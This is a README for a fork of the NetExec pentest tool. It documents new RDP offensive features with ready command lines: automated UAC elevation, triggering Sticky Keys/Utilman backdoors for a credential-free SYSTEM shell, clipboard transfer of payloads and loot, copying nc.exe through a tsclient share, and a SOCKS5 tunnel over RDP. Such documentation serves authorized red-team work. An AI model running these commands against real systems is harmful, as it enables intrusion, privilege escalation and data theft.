# NetExec RDP Enhancements — CyberStryk Fork

This fork extends NetExec's RDP protocol with several new capabilities for authorized penetration testing and red-team engagements. All features operate over a standard RDP connection using the [aardwolf](https://github.com/skelsec/aardwolf) library.

> **Upstream:** [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
> **Branch:** `rdp-enhancements`

---

## New Features

### 1. Elevated Execution (UAC Handling)

Run commands in a high-integrity (elevated) shell by automating the UAC prompt flow.

```bash
# Elevated shell — uses login creds for the UAC prompt
nxc rdp TARGET -u admin -p 'Pass123' -x 'whoami /priv' --elevated

# Separate UAC credentials
nxc rdp TARGET -u admin -p 'Pass123' -x 'whoami /priv' \
    --elevated --uac-username localadmin --uac-password 'UacPass!'

# Tune UAC dialog timing
nxc rdp TARGET -u admin -p 'Pass123' -x 'whoami /priv' \
    --elevated --uac-settle 5.0
```

| Flag | Description |
|------|-------------|
| `--elevated` | Open shell via Ctrl+Shift+Enter and handle the UAC prompt |
| `--uac-username USER` | Username for the UAC credential prompt (default: login user) |
| `--uac-password PASS` | Password for the UAC credential prompt (default: login pass) |
| `--uac-settle SECS` | Seconds to wait for the UAC dialog (default: 3.0) |

### 2. Splash Screen Login (No NLA)

Connect via TLS without NLA and type credentials at the Windows logon screen. Useful when NLA is disabled or when you need pre-authentication access to the desktop.

```bash
nxc rdp TARGET -u admin -p 'Pass123' -x 'whoami' --rdp-splash

# Password-only field (e.g., locked workstation)
nxc rdp TARGET -u admin -p 'Pass123' -x 'whoami' \
    --rdp-splash --field-order pass-only
```

| Flag | Description |
|------|-------------|
| `--rdp-splash` | Connect via TLS, type creds at the logon screen |
| `--field-order` | `user-tab-pass` (default) or `pass-only` |

### 3. Accessibility Backdoor Triggers (Sticky Keys / Utilman)

Fire accessibility shortcuts at the pre-authentication logon screen to trigger replaced `sethc.exe` or `utilman.exe` binaries — no credentials required.

```bash
# Sticky Keys (SHIFT x5) — get a SYSTEM shell at the logon screen
nxc rdp TARGET -u '' -p '' -x 'whoami' --stickykeys

# Utility Manager (Win+U)
nxc rdp TARGET -u '' -p '' -x 'whoami' --utilman

# Adjust trigger settle time
nxc rdp TARGET -u '' -p '' -x 'whoami' --stickykeys --settle-after-trigger 5.0
```

| Flag | Description |
|------|-------------|
| `--stickykeys` | Fire SHIFT x5 at the logon screen |
| `--utilman` | Fire Win+U at the logon screen |
| `--settle-after-trigger SECS` | Wait after firing the trigger (default: 3.0) |

### 4. Clipboard File Transfer

Transfer files over RDP using the native clipboard channel — no SMB, no HTTP, no additional tools on the target.

```bash
# Push a local file to the remote desktop
nxc rdp TARGET -u admin -p 'Pass123' --put-file ./payload.exe 'C:\Windows\Temp'

# Pull a remote file to a local directory
nxc rdp TARGET -u admin -p 'Pass123' --get-file 'C:\Windows\Temp\loot.zip' ./loot/
```

| Flag | Description |
|------|-------------|
| `--put-file LOCAL REMOTE_DIR` | Push a local file via clipboard paste |
| `--get-file REMOTE_FILE LOCAL_DIR` | Pull a remote file via clipboard download |

### 5. TSClient Drive Redirection

Mount a local directory as a `\\tsclient\<name>` share inside the RDP session.

```bash
# Mount ./share as \\tsclient\nxc on the remote machine
nxc rdp TARGET -u admin -p 'Pass123' -x 'dir \\tsclient\nxc' \
    --tsclient ./share

# Custom share name, read-only
nxc rdp TARGET -u admin -p 'Pass123' -x 'copy \\tsclient\tools\nc.exe C:\Temp' \
    --tsclient ./tools --tsclient-name tools --tsclient-ro
```

| Flag | Description |
|------|-------------|
| `--tsclient LOCAL_DIR` | Local directory to mount |
| `--tsclient-name NAME` | Share name (default: `nxc`) |
| `--tsclient-ro` | Mount as read-only |

### 6. DVC SOCKS5 Proxy

Tunnel a SOCKS5 proxy through the RDP session using a Dynamic Virtual Channel. A server-side component is deployed automatically via clipboard and runs inside the remote session.

```bash
# Default: PowerShell server, bind to 127.0.0.1:1080
nxc rdp TARGET -u admin -p 'Pass123' --rdp-dvc-socks5

# Specify bind address and method
nxc rdp TARGET -u admin -p 'Pass123' --rdp-dvc-socks5 0.0.0.0:9050 --dvc-method exe

# Use a DLL (loaded via rundll32)
nxc rdp TARGET -u admin -p 'Pass123' --rdp-dvc-socks5 --dvc-method dll
```

| Flag | Description |
|------|-------------|
| `--rdp-dvc-socks5 [BIND]` | Start SOCKS5 proxy (default: `127.0.0.1:1080`) |
| `--dvc-method` | Server deploy method: `powershell`, `exe`, or `dll` |
| `--dvc-channel NAME` | DVC channel name (default: `dvc_socks`) |

**Server-side components** (`tools/dvc-socks-server/`):
- `dvc_server.ps1` — standalone PowerShell script
- `dvc_server.exe` / `dvc_server.dll` — cross-compiled Rust binaries (source in `tools/dvc-socks-server/`)

---

## Files Changed / Added

**Modified:**
- `nxc/protocols/rdp.py` — core RDP protocol handler with all new features
- `nxc/protocols/rdp/proto_args.py` — CLI argument definitions
- `tests/e2e_commands.txt` — e2e test commands for DVC SOCKS5

**New:**
- `nxc/protocols/rdp/clipboard_file.py` — clipboard file transfer implementation
- `nxc/protocols/rdp/dvc_socks.py` — client-side DVC SOCKS5 channel and proxy
- `nxc/protocols/rdp/dvc_server.py` — server deployment helpers and templates
- `nxc/protocols/rdp/dvc_server.ps1` — standalone PowerShell DVC server
- `nxc/protocols/rdp/dvc_server.exe` — pre-built Windows EXE server
- `nxc/protocols/rdp/dvc_server.dll` — pre-built Windows DLL server
- `tools/dvc-socks-server/` — Rust source for the EXE/DLL components

---

## AI Disclosure

This work was developed with assistance from Claude Code (Anthropic, Claude Opus). All features have been tested against live Windows targets in an authorized lab environment. Per the upstream [AI_POLICY.md](https://github.com/Pennyw0rth/NetExec/blob/main/AI_POLICY.md), any PR to the upstream repo will fully disclose AI usage and include test evidence.

---

## Upstream PR Checklist

Before submitting a PR to [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec):

- [ ] Ruff passes clean (`ruff check .`)
- [ ] `tests/e2e_commands.txt` updated for new features
- [ ] Live-system testing screenshots included
- [ ] AI usage disclosed per AI_POLICY.md
- [ ] PR template filled out by hand (not AI-generated)
- [ ] PR references an accepted issue or opened discussion first
- [ ] Binary artifacts (exe/dll) reviewed — may need to be excluded or built from source in CI
